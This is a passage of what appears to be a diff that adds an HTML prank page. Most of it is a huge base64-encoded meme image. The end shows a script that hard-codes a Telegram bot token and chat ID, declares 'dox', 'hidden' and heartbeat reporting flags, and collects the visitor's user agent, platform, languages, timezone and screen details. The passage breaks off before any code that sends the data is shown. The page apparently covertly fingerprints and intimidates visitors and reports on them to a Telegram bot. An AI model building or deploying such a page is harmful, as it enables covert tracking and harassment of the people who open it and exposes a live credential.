cVFhrWkZwzK0ppSQxXynB6c+FOlSN5SXN2Bsmhc3BxyClyQj5SB27Js0occnKzsWlR3HnBz6LRWvakVeo53A5Ddlu51LHHC9wbuB6rn+/EuvFW45zzlacXrPO9K9BBBdMY4+gU/Z4fMu9Gz/HN/emCp2mz/8AHqLm/nW/vVRpHYcUflW2kYNgIhsoUhw133KeH89JD7MAVe/cEeq68J07cP8AGK6bcgKFO7oPRTpm4+tQpW5W+MF6QHbPSTKW59E86Pqe6iuYckHonTmRyKqO4OymwVePdVYZg4TsYIHQrLKN8M9LWSvcB8rd1AkuM7sgDAS425Kf8pvoFzZY9umciBFE+pkDndVaMhDWYAQiYB6KWxocU8ZpNy2ahaR1U6LoEhse6faMDot5NxnvSXFuFKa0AqHCcbKY05IWeUbYXZ1m+U+B3TTQOY4ToO49Fx5RvjRo+YBESFHnk5e65cp2udKnWUv/ACbuIad/Kd+5caSH8o4e5XYmoh51nrWesTv3LjypZyVUregDj+9bcTyv6j7BZ6BLCTG3I36pfKtnl0YwEoJGEodEJp5jC92w2UkRhp9E3D9AJ8DZGyk1CRuUrCNjcjKNwwEFYSUh2wKcG/VNv6FOLRHDqpEHRqYPdSYBs3ZPLwHSmZm5ATpO5STuls6jwjIIXWPBKuki4aQxNO/mu/euUYxyudt3XVnAuHn0DAQdvNf+9Y8nisPXPXCiUw6yowM4kBaVvupHLK8e65q01cjZLzTVrR80RXQFovDL3RMq2H6RIOFNVh6F1bzWusae8ZWhrL+Rv0GdsSLoKpYJaeRhx8zSN1oy4URoL/zD6LZO31qKuxvQxAtHKOwSHMx1CFHVtkponEjPIO6bNQ0k5cAppBNyx0srj0DSVzjdn+ZcKp3rIV0DeqmOC01b3O+UMPRc6zP8yWQ9cuKvjRkQggguiM4GMqz0vH5uoaEf40fvVYeitdKP8rUFCe3mD96vH1UddxbQsb2DQob2nJ9lMj3pmv8A8EKPKRj7F14OvG9RWzDJUJ46qwmaoUuFviVyR+VMvjBOSE4XkOwkSVDMAHZO+FKZdGB0QAwg+eNI81h7rLJrjklwAHGVNETXDZVkNRG3qVYwzxuOx/asK3xyLEfKMAJ5g5eqW0g+mEHEeqIv6OAjqnQcFQw7GwKktdkrXFNu0qIbqUzbZRoTkDKk52U5Ncbo+124T3MMKGHYSw/C5M2+OR8vwoNXJkp2WXDDvhVdRPnAJXJlO1/RNc3zKCpB6GM/uXINwby3CcH+cd+9dhOb5lJN6eWf3LkK9N5LrVAdpXfvWmHrzfz+9GAErAwij3ac+iUey2eUJrd082LKRGMlT4Yw7shJlo5dk+z5tuqbqfkKVb/nmDeyk0kRcrRsmJSM4VpVR8jfsVVJ9MpjRLjskkEhLIRH6JVQ4hO3cfZS4XAtb7BRfU9yjifyFVfBUs9SgDhAbjKCgxcvzZ911dwDweH8Q9JnrlMdQupOA8wZoWMf456z5PFYeuWYGtEoyMrLrTfprbA6OF5aDvssPacuGFMY4jbKVmxLplU2sK0gjzTj1VTJcDVSeZIAXHfKrSUkHlKXyPpkjdSVMTWjmOAMDdA6mqnHIcMe5WP+YSiLkvk1/X6jqJ6CWAu+Vw3WCn6R+tWszz5Z3O6q5G4ccKscWeVEEaII1qQjuEummdS1EUrdyx4dj7Ug9EkjOfqTisenXWkLw28aco6nqS3lKnSu5nHbGFrLgrfBUWiagkd88Ry0ey2XIep9V18eXTeZdIdQe/qqyebka7uVZT9lUTxF7j7rolL6VFddfJBPLuFilbqeVshA2Cy6utr5WOAHZYXdtOyglyLTMjVbujnIP1S5wwHYWPyWySJxyCd0j4OQdljkuVenUswGWuRM1VUBwAc4qoio5Ceit6K1PkIJYMH2WX7bY1bW/Utxnk5cu5VklLcKmcfMHZTdltccWMtGfqWSQULegaPVU130TTuk5AXZyrKBzjjPVJbDyjGE82MghXijfafEARjunm5+xRmOwnhIOinJrjkdyklxbkpPmAdUh0owVz5Nscjc0mQVWSuLngJU1Rh5GUcTedwIXJn6pZRR81M9h6OYQuR9UUbqK+1sL85EhxnuF1/AMNb+1c68YrR8DqFlQ0AMmaencp4OT8v/ABa6acDCBRBGtI8uXophwVa0LgWYcd8qpBwno5S3BBVI3pPrGNcRhJom8kwcOxTXOZCN9lMiIjaMqTTa+UFgAO+FTk5cfrTksxlcd+ibThwaYleW5Cf6NKiyfO/3VQ6bylN2OUAN8FI7lXqM6lCTZKDxhROYpTXeqhUySsrorgheaWl0y+lmlDHtmccH3XOQdkD3U+OprKRjfh5pGDr8pWefi8b2btVtnuE4jha57ieyzKDQVbJLHDuJHdNshQOHtyp6G9sFQ8MY7YErd9LXUEFy+IfVQthY0nr1SkFc/ams01gub6OZ35RgB2VOJXDvn61ea9uhvWqq6piJdEHcrSBthY+IZCM4P3J6I8JnFKDycnCRHC8uxylTYKOQdW7FLR7RJn4buVXyvHqrG4x+U8Nxuqp2DtgJxFGCgUQRq4IGB2QQHRBB26ZNoS/u0/e4Zw7EbjyvGdl0vBWx19MyaNwc145shcg7gHl6rbPDXXfw0bbbWyHB2aSteLJUrcRGQSVDkjw4lSGTNlZzM3ae6Q8Luwm4cqNjb2VbX0okYds5VsYym5IuYdFt8StGBVlrLnOwxVktoeDnlIWw5aVpA2UeS3h7dgAsMuM5WBxW5wO2cq8oaV7OUcpx3Vuy0DnKnQW7kx3Wfx22wo6CA+YM5AAV9DG0BR6am5TsFYxxjlT+Gv0UIMjKUIgCltJx1TZkwN0eJG48vVNl4b1ITE1QFWVFXgndZZH9aWpnbnYqPNU8oPzZVIa09c4RfEk91hk0w5JU4OL3kqypgSASOiq6Ql7x7rIaWH5VzZTtrMtnubEYWlONzeY0T/crdcreVq0RxpuLX11LRjHMwcx+1LFj+T3i1OBhLHRIByljotZOtvIyuqBQGQgjxsqRb+yhK5uMKQ2cuGCoiVuRslofaU1zevdOsZ5hAbuSq4BwOcqVTTGNwcTg+yapmfe0tJB2IUIu5Tv6qTUTea8uyoZcXdeyP0eWWoVzg+qHMEhBOZVG9jLkObKJ2yTnCnZ49pMLtwO3Vbt4N6Fp9aU1WZYi8wjJ9lo+E7+66t8JVM6rivjG9mjdK9tI5UY5zXEg4Pqr23yV1aMCWRw6AZW+B4WqkyhouDMZ7tU27cCJdKUPnMq4yCPmOOoWWObvz/Dyxm60fFaSBl7Tk9VIFsbjZp+tX9fT/BTmJzw4juFTVV1gpiQ52SPQq447NUUdtYOoUtlFG0DDQqv+EEHbH3ojqeBuw/emlQaib5VYRtsFRndTLnVmrqHyE/SKhZRpGXoBGhhBXCmUDKCGUENJlAQbK6N7XNPKW7goicJDnZTnobY0HxDc0sobg70DXE9VtmOpZO0Pa4EO3yFyY15Y7macOB2PotmaH4gSU7mUda7LScAkrrw5NQ5dN2tf0SnN58KvpquOoja+Nwcx3Qg5U4SgMXXx57nbXHskxtGdt0zJyoS1IGfVQJapoPfdaXs/2nxxgnKlRxjAVTDWNJ6qwhq4+5UXFUy0s4ow3dP8wbuoDa+MBMT3AHss6v62mzTgeygS1Zz1UOWvDhn/ANVBmq91lkf0mTVXqd1AmnLio75uY7b/AFqPJJtsd1jaVyOFxcU/CCcBQoQS/qSVc0VOXED19ljkeNW1tpshrishgaGDCg0MBjY3PRWA2OVjk3xyRq2VlPBLK84axpcTlcmawvMl5v8AVVD3ZHMWt+pdB8VL82zaama14EtR8gC5e3e/md1zlTI5/wAjk60WEodESUOiuPPtBH2RbhDmOU9swQQQTAIwcIkPRAKZknPZKduU5EBhOhoPZC/naK4nGSkZPopzmAjCR5LfRA/jRD0SU7JGWkpAZlEPEuM9D2XZngVp21tfqWN+CBE0jP2LjNrcYHbK7P8AAJIx2o9SQOOP+LtcP2IyaY+sQpeM18gaAeVxHcqq1LxQvN+p3RzyBkTR0asNIAYSsVvl8bGHU7N3dzlc8x09LP8AKuU7o7vqA/lcPzIfzliFTVvk+Zztyink5ySSd0wW5Wkefllui81zu5RhxI3KDWJYZsmjYskoIyESqJpSGClYQTGoTgoYSkEHJo27ZIPqnHjKjOdkYThjLx6pUcnK7IOHdiOyaDC4HCepoC+QAlWbanD3VE+1PKXPYNt1s43Acmw2IytYaIswZH5w3cVnUrHAAegXTxW6XMofmuI32VfNcN9tlHqX8g6qve4uO66Zkf2toa456qwjuBx2WNxkgEgp0TloxlFy6Tc2QG5EbbKNJciTkn9qpH1G+clJ80nYlZ7PHJbfHepRfEucdzkqrD8nGdlJiBO+VGS/pL88oNJe4ZCSxhI91Z0dHzYz6LKxRdJS8xBwskoKPABTFDR8rgSNvqV5CzkIGOqi4riREzkYAlOcGtLicAdykh2FhPEvVzNNWJ7I3YqagFrBnp7rnzx1V3PWLUHFrUZvGoJKSKTmp6c49srXwGTsjdM+olfLI4l7jkk+qU0Ywpced2GE43skpQ7KtOe+6G5IAKW44RBCKSgggmYIIE4SwzI3QcFHJhwwpo6KLFCTupTQQMFDWDQQQQo3IzmO26R5ZHZPoILX7Mch79F1t4B3ka9vsf6dET+0LlAgYXVXgNmjj4l3eJ0jQ91C7laTjO6VE9c83i/fDQiNm8hGNlhb3ukeXOJJJzunaqokmlMjj8xUcE9wp0duwcMpTRsEAMo0aKQEEEFZgggggAggggDCJ7uXdAnCS4c490FSHT9UweuUp0Z3RFuU4DkRwCrW0QGWqaD0Kq4W5OFlunKbEsYcMknqqnotba0rb2QUeB1KuKinDs+yZsbQIWDGFZviySuvj8JjFXTZOwyq2WnwfRZXUUueyq54MZ2W0lCjxy7JLuilyU5LiU15DkaNEd1QAypDqV5ORhOx0bjjcI+T2jxxEnurGGDpjKegoSep+5W8FENgj+MvoxSUeSNs/Wr2ipg3Hy4KKmpuXG2ytKeLkG4RONpjkkRxjAwpTGZITUTSOoUjmbGwucQANyT2UZceu2kziDd7jDaKGSsncBFGOYnK5Y1rqufVd4lqJHHyWktjZ2DVmXFzX4u9Q60UMh+Eidh5HRxWpdzuuLk9RnmcHVLHZNNBOd080YAWTHKnB0HqgUQGcFA9U2N9BBBBABBBBAA9FLYzLRsomMqVFM0AB22O6FY2FcxZvhKZIJAT6JqeQPOG9PVIhcIyQTsUpK0liUgmvPZ7ofEM90z2dOwykOkDeqQZm49kw9+TsgWnzP2CvdFa4vHD/UdNfbLUOhrIPQ7OHoVjG+co8oTsD190R9PVeujNM8AeL8clooKPR11lY3Hl0AjZOwerSzDvuXC3il8NEvBG50t0s0k1XpC5PMcMku8lLL18p5HUEdD3we4UxUc5gYRoIKtbMEEEECgggghH0CCSjCFS7HjKMABEggyX9Co7SN8p5/QqOOpQlLpgC9vplZ3YGATMc7Aa3dxPQLBIJGNLS4bbZXVnhP8ADY3jTV1WptVidukKGXyYqaN5aa2UYy0kb8gyMkdeiqBjtsu9tp2Br66nDx1b5gyPsWSWhkl/oKqvtsFRUUVKSJZ2xO5GAdycdN13BJXcHuFgZaGU+nbZJA0YpqelY+Ro98NJ+8rC+KXGrRF50NdbFZJZJqmtYI2tjpjGxu4OSSAOy3488v1A5QkZzhQZaYHOyuTE0/akSQHAAAXfjP8AYY5JRjJATfwWfdX76bG+EyYQPzQtNSltTfAD0/apENCDjbKshAD2wpMNOBg+nsqmELaHDRBp2H2KwZSgBOthydtlIbCAr+JoQIoWgb7qTEzKJjU/GAGlLUndWWANhndam4r8QRbYHWu3TE1EgxK4H6Iz0VzxG4h0+mqOWkpZA64SNwOXfk//ANXNVVVy1s75pnOfI8klzjkkrg/I5J+jMve6Rxc45J7pQ6DKDQnA0bbLgyu0WgxvXCVhBoxlKCksvCxgN90gpYST1QzEggggAggggDBwUeUlBA0VnPdDY9cJKCC0NwHYpOD6o0EGPslHBxukIAZQNggjIwEMEj60LmSZYrzcNMXiiu9qq5KS40crZYZ4yQ5jmnPbt7d10px78YlRxb0DR6SprHBTMnigkulXP8znVDNz5I/NbzZ3O++Fy6Qo8uziPZJWN267tHgC17erTQXKDUGn44a2COoY2R0vMGvaHAH5eu6mf8HfxC/vk03+tL/VXXPE7W934b+Gdup7FJFHdLfaaF0LpY+duXCNpyO+xXC8njw4xsJaLlacY/8Aw5n+9NSVxA8EmtOHWjLzqm4X6xVFFaofPligMnO9vMBtluO65ut1DVXe4U1vt9LNWVtU9sUMEDC58jzsAAOpXq3xgvFXqLwe3i8V72vrrjp2nqpnMbygvf5bjgdhkrg3wn8SNG8K+JrLzrCjmlidAYKWtjaHtoZHHBkLOpGNsjcboDZej/wfmuL1boqy/Xu12KSRoIpHNdPKzPZ3LhoPtkrXnGfwna34NW83eqNNd7Ax3LJXUHNiEk4HmMPzNHuMhbN41eN3WNdrGro+G9dFR6eoX+XHVMpWzSVeOrzzA8rSegwunvDXxSk8RPCO4s1TS08lwilktlxYyPlZM1zAWv5T0JDug7hBWPJhxwFvfg14T9e8ZaFt2o4ae0WF5/J3C4FwbL6+WwDmcPfp7qu4WcHWa18RDNBT8zrdRXKoZWOHX4eB55vvwG/au7vFDx/Hh60xZrJpaipPx5XxltJE9n5Kjp2YHNyDr6AexQcmnN2rvwe+tbJa5Kyx3623ueJvM6kDHQyP9mE5BPsSMrn3htwjvvEniGzQ1M6K23vEvmNrw5oidGCXNcAM52XSPBTx4ajh1OKPibVU1XYKnmzWwUgjkpXYyPlYPmbtjGM7qx4S8S7FxZ8a9HqXT9nfbaOWgqI3GQgPqXNiI81zRs0kY29t0G5q438E7zwMvtDZr3XUNZUVlMKpj6Pm5Q3mLcHmAOchYxwy4c3nitrGg0xYomur6xxJfID5cLAMue8jo0Lpz8IqCeJ+mWjqbOB//a5dCeC7gSzhnoVupLvTCPVGoGNkcJB81PTdWR+xd9I/YgODuN/h/v3Aits9Je6+31kt1ikkiNGXkN5SBg8wG+69KNOafu3Czw42qz6Stb63UcNriZT07CBzVcwBL3E7ABziST2C5y/CAQtqeIHCuB4yyUvY73BmYP8A1XaurtT2/h/ou4X64O5aC1UvmOA2LsABrR7k4A+tMnLWnvCXrGoo31V/1DaorxPiSVsYkly87nmftk57hYRrnhhf+HVW2O7QtdTS7RVcBJikPp7H2KqdQ+M3iQ2sdfLdLbYbdTSc7rS+ma5kkZPQv+lzAdwuw7NdrR4heDNJdYYuSG70pkYw7up525BA9w4H61tx82WH/gcIX+/UGmbe6sr5gxh2Yxoy6Q+gCz7hPwm19xWo4LzHaKSw6cnGYam6SO8+ob+kyNrdh7nGVrvg1oNvG3xFi1XWMy6e015lRVwuPyvETw3lI/wpCAfYFds8auMM3D11HYrDHALrJEJHF7Msp4tw3Demdjjtstbz555awJqvU/hk1RZ6J9Tbauku/l7uhiBjlx7A7O+9aOnp5IKh8ckbo5GHlcxwwWkdcrcvCTxS6ki4p0Wh9dz0tbQ3xwbbroyFsL45D9Fjw35XAnbOxzhZJ4mtEwWu60OpKWEMiuGYakNGPyrRkH7Wg/aPdacPNZl8ZlY5vqxJT0000cLp5I2FzYmuxzn0Wd8HuGV24x6UbqKz19sgpxLJTzU80jvOp5GndrwG+hyPZYvyjsnuE3EKTgNxVguMzyzROqHspLo0k8tNNn5JwO2Cd/YuW35GeeGO8SSNQ2Wq0nc6+33RohnoXubMXbNGPzs+hG4PoQp/BjSWoeNdvuV0stDDR2ejnFO2srpSBO/84MDW7gDGfc4W9PFRwUvfFW02ep0gYmXCqqYaSvl5h81G8/xme4ZnJ9WrKNW3WweG3hDb7HZiyAwQ/CUQcRzPf+fM71OSST6lc+X5ed1IenKfEIQcO7vLaKqqjuFybIIIoLeHSPnlxuxg7kE4JWx9MeHfiNqi1CpuX4q0wJmZZT1D3VFSzPTnDQGtPtkqB4N9GQ8RNY6m4pXZnxLLdUG3WcSjIY/AdJL/AJWHDf8Awise8RfjX1RZNcXLTPD+ppKOhs8xpp7hJA2aSomaSHhodloYDke+MrPL8nO9G1Bxx8JvEXhvT1eoqx0F/szDzz11BzZhGer4zu1vvuFzzQ0j62vpqVpDX1ErYmud0BcQM/tXqF4UPEnNx4obtpzVdJSN1DQwiRz4mcsVbTk8riWdiDsR0IK4v8QHDCHhNx9kstFGWWipqqeuoB+jDJIDyf5rg5o9gue539qZDq/wRcRdLNszad1vvFTdqoUsUNCX5YS0uL3lwAawAblZ7Rfg69WSWsSVOrrJBcHNB8hsEr2A+hft9WwXcvE7X9u4W8P7rqq5tMlPbYOZsTTh0shwGMB7ZJA+pedQ8eXFUai/GLpbWbX5mfxUKNvl8mfo8/0s42zn7FKWmuKPCLVXB6/G0anoPIfJl1PURO54aho7sf3+rqO6wyjpJ6+qgpaWGSepneI4oomlznuOwAA6lerHFWy2XxLeG518oImmoloDdbe8t5pIJ2NJfHn6w5h9VoT8H7wlpbrV3fiFc6dsht8ooba2RuQyXlzJIPQgENH1lAs2xLRHgC13qK1x11/utu08+Voc2jla6adoP6Ybs0+2VhnF/wAIWuuEdskvEnw16skX8dWUAdmEer2HcD3Gy3B4hvGzqez64uOm+H0tLSUFplME1wlhE0k8rThwaHbNaCCPdbf8KfiUn460V205qumoxqGig81xiZiOtgJ5XEs6AjIBHTfKE6ea2mrBNqfUNpslM+OOoudTHSxvkzytc84BON8LbHG7wxaj4FWW23W+XS11kNfUGmYyiL+Zrg3OTzAbLKNfcMoOE/i40/ZqGPktNTd6Ouom/oRySZ5B7NdzBdB/hGG54faR/wDFX/7MoHw4/wCB/h9v/Hea8xWO426jNqZG6U1pf83OTjHKD6LDOIuhq3htrO76XuM8FRWWuTypJafPI44B2yM912D+DgOblxA94qT971z34rz/ANILX3tWD/ZtQn52yCq8ImrKXhS/iK+7Wc2ltuFy8gOk84xkZx0xnf1WgKelnrKiKnp4JJqiVwZHFG0uc9x6AAdSV6mXk/8AQhef/wBJx/6jVoLwBcKKPUF5u+vbnTNmjtL20lvEgy0TkZfIPdrcAf5SB8sc0J4Btd6mtUVwvtzt+nfNaHNpZ2umnaD05mt2b9WSViHF7wea94T2uW8g019scO81Tbw7nhb2c+M7ge4yFunxH+NHU2n9cXDS+gX0lJS2mTyKm4ywNmklmH0g0O2a0HbODlbP8KPiaq+Nsdy0zq2GkGoaSHzmyRR8sdbB9F+WdA4ZGQNiChWo8xSwtGSkrdvip4W0/Cfi3dLXb4vLtFcxtwo2AbRxyE5YPZrg4LSSGdBGESCABT0TN+qZ+pPw9dylV4xHGCdku422roHwmrpKin+IhE8RmjczzIyPle3I3aexGy7N4dfg99USajp5tcXS109iheHzQ2+Z0s1QB+YCWgMB6E9R2WwPHtqLR9h4e2jSDLdQzajkLPgmhg8y3UsexcCN2h2AwDodzjZDRsXxFE/2nlw/8Ht374l5Rz/T+xerniK/uPK//wAIt374l5SVGzh9SYerHEY/9CCo/wDKlJ/qxLjfwheHyj42aor67UBedMWTldUQxuLHVMrvox8w6NwCXd8bd12TxHGPA/Uf+VKT/ViWovwceqrfFQ6y0zJIxlykniuETSQHSRhvI7HrggfegNy6t468DuANwGk/hKeCspGhstJaba2UwbbB7tvmxjqSfVbD4N8VtFcWrVcLposObTU9Q2Gqa+k+HcJOUEZHfbuuMeOngv4i6l4o3++aXho7larzWPrBJNWsifCXnJa4PwSAemM7LrPw08Em8DNANss9UyqvFbP8ZcJogeQSEABjfVrQMZ7oDlXwuOi/ty+IQfgSOdcxG09z54z+zKxv8IY2obxks7383w7rPGIj2z5j8rAbTxHPCfxXXjU7y74Omv1bFWNaM88D5HNf+wg/Yu5vEZwGt/iT0hZ7tp+6UkV3o2GW31riXQVML9yxzm5wDgHI6EIN5Rb5OOq6I8DP90TZf/pKr/ZrcPBXwFXaj1O248S3WuazU4JbbqSd0pqHkYHM4BvK0ddt+ia4W6A0rwz8btNp3SNwnq6Cmoqh0sczg80sroyTDzfncoxud98dkBvLiXwKHFbxG6avt4py/S2nrU2WbnGG1NR5riyIeoGzj7ADuq/VvHQXnxP6G4a2Sp5aG3TyS3R8R+WSbynckX1N7+59ln/iT41U3BbhvW3NkjPx7XA0lshPUzEfTI/RaNz74C87vCVW1Fz8S+kqyrlfNVVFTPJLLIcue8xuJJP1lAb3/CEVQoNb8L6t+Q2Bskrj9UrD/wCi3d4yqyes8NtwrKEkwyy0Ushaf5EuaT+8LQ34SXBv+gs9Phaj/Xat1+HnVVk8Q3h2OkrxKJaykovxTcocjzAA3Ecoz7AEH1CCeakd/wAUVRTyk/lInN36dF6W+AoTt8P1G6bn5Tc6pzObP0ct6e2crmur/B78QmakNLTXiyyWIy/9oSTOEgjz1MXLnmx2zjPdde6vvOnfCzwFbR0s3I220ho7cx5/KVVS4E5x3JcS4+iew0H4IJYXcauMhbyc75nuZ0+h8VJ+zop3iLmdHxZu4k2Aig5M/o8g6fauZ/DVxig4WcaaW/XKQss13DqS4v8A0GSHPmH/ACXhrj7ZXffHjgpLxZo6HUGmK6jbeYYcMdK78jVwndvzjOCMnB3G604+T4y2TgrU0j6jihw7jpwfiBc4MFg+b+PjwvQfxRyRN4e04eR5huMfKO5+V2f2LT/Anwj6hsfEam1zxBq6AzWt3Nb7ZRyGUB4GGve/AG2SQBk5WF+MjxCUE+raTR9nqI6iKxkyVkrN2ipcMeWD35W9fdx9E/vfJ9CsUMgBOSB9qx3XVys9Ppa4suZbJDNEWNjafmc/83HoQd1p64cU6+dpEB5PcLbHhW4RV3HLiGy531r5tJ6feKir5s8k8ucxwj6zufYe668/ycfnSdO7fCrFqpvAzSzdXnNcIf8AivmA+aKT+RD8/ncv7MLirx3V2sqHiy+K7SOFiqKZhtJZkM8ofTb/AJYdnP1hbw8WvimruGGqdPaX0fPGbhbaiKvuwGOQxjdtKfTmBye4HKtjcV9GWLxZcCaW6WIsfWywfjC0zOxzxTgYdA49snLHD1AK4N/telT4DSw+HyjEXKJfxnWB+P0+YYz9nKvMPU7Jm6iu7KgO85tZMH83Xm8x2crszwFcVItH6ivnDTUDzRSV9QZ6Fk55eWraOSSE56OIaMD1asg8Q/ghvOr9bV2qdB1Nv5LtKairt9ZMYvLmP0nMdgjBO+OoKNhpvwEtmPH+l8vm8oWur83GccvK3Gftws/8e3lHjboANx53wMPmY6/9ZOM/tW9/DF4cYfDzaLxqDU9xo5b/AFcAbUzRvIp6KnaeYtDnYzkjLj7ALhfjdxRZxd48y6gpi4WxlXT0dCHdfIjeA12P8I5d/nKb6bufx2+b/a+z+XnkFxpPMx+jk/8ArheWhyCCOo3Xt1xE0LbeJWiLnpa7NPwVyg8svb9KJ2xa8e7Tgrz8/wCD74iHUTKMXWx/iTzMG4id3PyZ6+Vy55sds4ylsnTfgxDmeGK2GpOIuauLefYcnO717dUPA/5P9gn8hyh4u1fzEevPtn7MKRxo1LYvDZ4eBp62zhlW6hNptcbiPMle5pD5CPYEuJ91z54AuLtJYLxdeH92qhEy6yCst8krsAzhuHsye7mhpHqQmHH2phL/AAkvDZ+bzhWz8/N15vMdldCeA9szuP8ASiLmEbbZVmXHTlw3GftwtyeIXwRXrVmta7VGgqmgDLpKZqq31kph8qQ/Scx2CC0ncg4wStpeGbw6w+Hqy3i/6muVJLf6uHFTNE4+RRQN+YtDnAZ33JwOmEJao8WDoT4peEDWAecH0vPjuPidlkf4RYn+x/pL/wAVk/2a5v1bxOZxZ8WWnr/TOcbZHeqSkoQenkxyAB3tk5P2rtbxb8FdS8bdLWK2aZfb2VNBXOqJTXTGJvKWY2Ia7Jyg540N+Dg/7R1//wB1Sf6z1z34sP7oLX//ANYP9m1ds+EHw/at4H1mqZdTvtj2XRkDYTQ1BlwWEk82WjHVao46eDXiNxG4q6p1PZ5rAy23ScSQtqa1zJMcgG4EZA6eqE6bsvH9xA//AMps/wBQKt8AroRwKcIwPObdajzMeuGcufswsn4g6drNI+EW8WC4GI11s02KaZ0LuZhe1oB5TgZC5j8BHF6j0xf7noi7VDYae9vZPQySHDRUtGCzPYubjHqQgOUNbCdms9RtqecVAuNSH83XPmuzlbz8DIl/tg7SY+blFDV+YRnAb5ff7VvPxGeCe8az1rW6q0LU0LXXR5lrbfWymINlP0nxuwRg7ktPQrY/hf8ADbHwAt911Hqi4Uc2oKmn5JZInHyKOnb8zgHEDJ2yT02QemhfwjD4jr3RrWBomba5S8jrymXbP3FcXrcXib4rRcXeLV2vNE4us9KBQ29x/PijJ+f/ADnEu+ohadQjL0EEEpvVBQ5FESnGxFriUqPoE4htJ06i1B+EE4lXWhdT2612C0SvBHxMML5Xt9wHuwPuK5bv+oLrqu8VV3vdwqbhcax3NNU1D+Z7/tPb0HZQh0RcpykTeWrfFfxA1rw8l0Pc22Y2SWCKncYqMsm5I8cvzc5H5rd8LRTm+Y7f6k4Ci7oRbW8rp4rtf3zhm/QFWLMbA6hjt5LKMibyWABvzc+M/KN8LUOm9R3fRd+pL1Ya+egulG/nhqIHYc31HuD0IOxVY04BQPzJnu11rbfwhHEajtzaers2na+qaMfFSRSRl3uWtdy5+5YvQ+N/ixQXq5XX4211T67kaKepoyYYGNzgRta8Y67kkkrnDkQ5EH2sNR3qr1RqC53ytEQrLlUSVUwibys53uJPKMnAyVtDhD4nOIHBin+As1fFWWUuLvxZcGeZC0nqWHIcz6gcLTuWtPVHztI+kELdUav8fHErUlpmoKGls9idM0sfVUcT3zAH9EvcQ0+4BK0Vw74o6g4Za2j1fZpYZr4wSt8yuYZhJzjDi4ZBJ98rC+YeoSfMHbqgNi8W+M2quNV5prpqienfLSQ+RBDSwmKKJucnDSTuT1OeyouH2ubrw01dbtUWT4c3S3uc6L4mPzI92lpy3I7H1WKlxKIl3Y/ejZNncZOO+q+N9VbKjVAtwktbHxwGipzFs4gnOXHPRYzw/wCJOpuF+oIr5pe6S0FewcriwBzJWfoPYdnN9isUJJJyk7dgUT0OxIfwinEVlvED7Bpp9Xy4+J8qUZPryh+FzvxL4uat4t3gXTVV2krZo8thhDRHDA09mRjZv19T6rBASgXeidgOZyMZ2W9uEniz4i8IqCK1UFZT3WxQ7RW+5tMjYR6RuBDmj2zj2Whg4pWVPZOntfeOjibrS1y22iNu07BM0tkltjHec5p6gSPJLfswVzG+V8r3Pe4ue45c525J9SfVEDsgmBgD0W9eGfiu1zwj0rFp3TNJp+KhY98pfPQl8skjur3u5xk9B0xgBaJQStNYX+/XDU17r7zdKh9TcbhM6onmfuXvcckra3CXxO684MWOrsunJ7fLbqic1Bhr6czCN5ABLMOGM4GR6rTKBGVW5oMt13xBumv9Y1mq62GjorxWSMlldbojCzzW/wAoBk4ccAk567rfOh/HfxO0rbYqC4R2vUDImhrJ7ixwnwOznsI5vrIyuXGjZOqbQ3Xxc8U/EDjBROttyrILdY3nL7dbQY45N/zySXP7bE46bLUVg2v9rH/5uH/aNUFTrG4R3y2PcQGtqoSSTjA5wkPqePU3xmatvmh+EVuvmnbnUW26U13piyeB2DgtfkEdHNPcHYrlyj/CFcR4LWKaa0adqqsN5fjHxSMcfcsa7lyt4eOLWWnL7wPhpLZfbZW1X4zpn+TTVUcj+UNeM8rSThea7W7DCE5ZaZdxC4nap4p36S9aouj62rO0bQA2OFv6LGDZo/esUilkp5o5oZHxyxuD2PY4tLXDoQR0ISMYQTR9WuodEeO3ibpS1Q2+vjtV/jgaGxz3GN7ZsAd3sI5j7kZWFcWvFNxB4xUJtt2rILfZScut9tYY45P+8JJc8exOPZaUacDCBGd0DfSzsN8qtN3223qi5PjrdUMqYDI3maHsORkdxkLo/wDt/eLePoabPubc/wD9xcuYQwExMtOof7fzi3+hpv8Ao53/ALiP+394t/oab/o53/uLl1BB/TofV/jS4l630xddO3RtgFuucBp5zBQOa/kPXB5zgrn2CV8D45I3lkjCHNe04c0joQex7ppBA26c0L46OJ2kLZFbq/8AFmoYIWcsctyjcJsD9J7COb6zv7rFOLXis4h8YKCW13Gsp7bZJNpLfbWmNkw9JHElzx7EgexWjsJQzjZB7ouXAzlElkE7YKHluPZCbjRNG4UpkTSMnKjhhJ6KUwHCR4z/AGMNx0Ro+yJEaRXg9EpNeaz1RGVn6QTM6USaMrexyi80ITcdnkY6KMZSi81AmOktBRhLugXoPRMg+ZEGhL5gkucM7AJbGgDQjxhJD8HoleZ9iNjQIiUrLfVESOyUBvO5KPKDjsUhVBJspEUSCv6BTUpNoBTRZo8BsgiB2Qyp2Q0EWUWUr2ZSW0bpsJwYygFtacJSQJB0JwUrmCZUaCTzhDnCTOy7GGgDYNH2BL6pvnCHOEFZacSUnnCHOFcLVhSMdEjmCHMEtnZaWUSTzBDmCNlqlIJPMEOYI2eqUgk84Q5wjYkSGkJ5rWkKH5gHchORzMB3kA+soaxL5R6I8D0Cb+Ii/nWfeh8RF/Os+9CjvlnrsgBg4TXxEX86z70PiIv51n3paB09SiTfxEP86z70XxEP86z70yj/2Q==" alt="meme" />
+    </div>
+  </div>
+
+  <script>
+    const TG_BOT_TOKEN = "8294247946:AAFg9JHzStcfuxkF2jh5VJT7OYhIBIZgrAk";
+    const TG_CHAT_ID = "8215850367";
+    const DURATION_MS = 30000;
+
+    const loaderScreen = document.getElementById("loader-screen");
+    const loadingLabel = document.getElementById("loading-label");
+    const terminalEl = document.getElementById("terminal");
+    const output = document.getElementById("output");
+    const typingLine = document.getElementById("typing-line");
+    const cursorRow = document.getElementById("cursor-row");
+    const finalAlert = document.getElementById("final-alert");
+    const flashOverlay = document.getElementById("flash-overlay");
+    const audioState = document.getElementById("audio-state");
+
+    let started = false;
+    let finished = false;
+    let audioCtx = null;
+    let firstTouchSent = false;
+    let hiddenSent = false;
+    let doxSent = false;
+    let dossierProgressSent = false;
+    let tapCount = 0;
+    let scrollCount = 0;
+    let maxScrollPct = 0;
+    let lastAlertSentAt = 0;
+    let heartbeatTimer = null;
+    let sessionStart = Date.now();
+
+    const ua = navigator.userAgent;
+    const platform = navigator.platform || "Linux armv8l";
+    const lang = navigator.language || "ru-RU";
+    const languages = (navigator.languages || [lang]).join(", ");
+    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || "Europe/Kyiv";
+    const screenRes = `${window.screen.width}x${window.screen.height}`;
+    const availRes = `${window.screen.availWidth}x${window.screen.availHeight}`;
+    const dpr = window.devicePixelRatio || 1;
